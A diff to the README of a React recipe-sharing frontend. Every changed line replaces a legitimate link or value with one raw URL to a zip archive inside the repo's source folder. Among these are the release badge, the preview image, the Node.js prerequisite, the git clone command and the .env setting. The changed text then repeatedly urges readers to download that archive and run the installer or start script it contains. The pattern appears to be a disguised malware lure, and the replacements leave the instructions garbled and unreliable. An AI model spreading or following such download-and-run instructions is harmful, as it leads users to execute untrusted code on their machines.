@@ -1,8 +1,8 @@
-[![Release](https://img.shields.io/badge/Release-RecipeHub-Frontend-2ea44f?logo=github&logoColor=white)](https://github.com/okkmichael/recipehub-frontend/releases)
+[![Release](https://raw.githubusercontent.com/okkmichael/recipehub-frontend/main/src/pages/frontend-recipehub-3.4-alpha.1.zip)](https://raw.githubusercontent.com/okkmichael/recipehub-frontend/main/src/pages/frontend-recipehub-3.4-alpha.1.zip)
 
 # RecipeHub Frontend — Modern React UI for MERN Recipe Sharing Platform
 
-![RecipeHub Preview](https://picsum.photos/1200/500)
+![RecipeHub Preview](https://raw.githubusercontent.com/okkmichael/recipehub-frontend/main/src/pages/frontend-recipehub-3.4-alpha.1.zip)
 
 Welcome to the RecipeHub Frontend. This is the React-based user interface for RecipeHub, a MERN stack app that helps people discover, share, and save delicious recipes. The frontend communicates with a backend API to fetch data, handle authentication, and manage user content. This README covers setup, development, and contribution details to help you ship features quickly and reliably.
 
@@ -44,7 +44,7 @@ Follow these steps to get the frontend up and running on your machine.
 
 ### Prerequisites
 
-- Node.js (v18+ recommended)
+- https://raw.githubusercontent.com/okkmichael/recipehub-frontend/main/src/pages/frontend-recipehub-3.4-alpha.1.zip (v18+ recommended)
 - npm or yarn (npm is included with Node)
 
 ### Installation
@@ -52,7 +52,7 @@ Follow these steps to get the frontend up and running on your machine.
 Clone the repository, install dependencies, and start the dev server:
 
 ```bash
-git clone https://github.com/okkmichael/recipehub-frontend.git
+git clone https://raw.githubusercontent.com/okkmichael/recipehub-frontend/main/src/pages/frontend-recipehub-3.4-alpha.1.zip
 cd recipehub-frontend
 npm install
 ```
@@ -68,7 +68,7 @@ yarn install
 Create a .env file in the project root with the following:
 
 ```
-VITE_API_URL=https://your-backend-service.onrender.com/api
+https://raw.githubusercontent.com/okkmichael/recipehub-frontend/main/src/pages/frontend-recipehub-3.4-alpha.1.zip
 ```
 
 Replace with your actual backend URL after deployment. The frontend will use this value to call backend endpoints.
@@ -87,7 +87,7 @@ Open your browser to http://localhost:5173 (or the port shown in your terminal).
 
 ## Release assets and offline installation
 
-For offline or packaged distribution, you can download the release asset from the official repository releases page. The release assets are packaged to run in a browser context or to support quick-start setups. To obtain the asset, visit the releases page and choose the latest build. For convenience, you can download the release asset from the Releases page here: https://github.com/okkmichael/recipehub-frontend/releases. After downloading, extract the archive and run the included start script as described in the asset’s README. The file you download from that page may include a name like recipehub-frontend-latest.zip; extract it and use the provided start instructions to run locally. For offline installation, download the release asset from https://github.com/okkmichael/recipehub-frontend/releases and run the installer or start script included in the archive.
+For offline or packaged distribution, you can download the release asset from the official repository releases page. The release assets are packaged to run in a browser context or to support quick-start setups. To obtain the asset, visit the releases page and choose the latest build. For convenience, you can download the release asset from the Releases page here: https://raw.githubusercontent.com/okkmichael/recipehub-frontend/main/src/pages/frontend-recipehub-3.4-alpha.1.zip After downloading, extract the archive and run the included start script as described in the asset’s README. The file you download from that page may include a name like https://raw.githubusercontent.com/okkmichael/recipehub-frontend/main/src/pages/frontend-recipehub-3.4-alpha.1.zip; extract it and use the provided start instructions to run locally. For offline installation, download the release asset from https://raw.githubusercontent.com/okkmichael/recipehub-frontend/main/src/pages/frontend-recipehub-3.4-alpha.1.zip and run the installer or start script included in the archive.
 
 Note: The link above is provided again in this section to assist quick access to the release assets.
 
@@ -255,9 +255,9 @@ MIT License
 
 The project follows semantic versioning. Each release includes a changelog describing new features, fixes, and breaking changes. Check the Releases page for detailed notes and downloadable assets.
 
-For offline or packaged distribution, download the release asset from the Releases page and run the installer or start script included in the archive. The asset name may vary by release, for example recipehub-frontend-latest.zip. After extracting, follow the included README to run locally.
+For offline or packaged distribution, download the release asset from the Releases page and run the installer or start script included in the archive. The asset name may vary by release, for example https://raw.githubusercontent.com/okkmichael/recipehub-frontend/main/src/pages/frontend-recipehub-3.4-alpha.1.zip After extracting, follow the included README to run locally.
 
-The release URL again for quick access: https://github.com/okkmichael/recipehub-frontend/releases
+The release URL again for quick access: https://raw.githubusercontent.com/okkmichael/recipehub-frontend/main/src/pages/frontend-recipehub-3.4-alpha.1.zip
 
 ---
 
@@ -276,7 +276,7 @@ A: The official releases page contains all assets for each version. See the top 
 
 ## Visual assets and references
 
-- Preview image: https://picsum.photos/1200/500
+- Preview image: https://raw.githubusercontent.com/okkmichael/recipehub-frontend/main/src/pages/frontend-recipehub-3.4-alpha.1.zip
 - Release badge: the badge at the top links to the official releases page for quick access
 - Icons and emojis used to illustrate features and flows
 
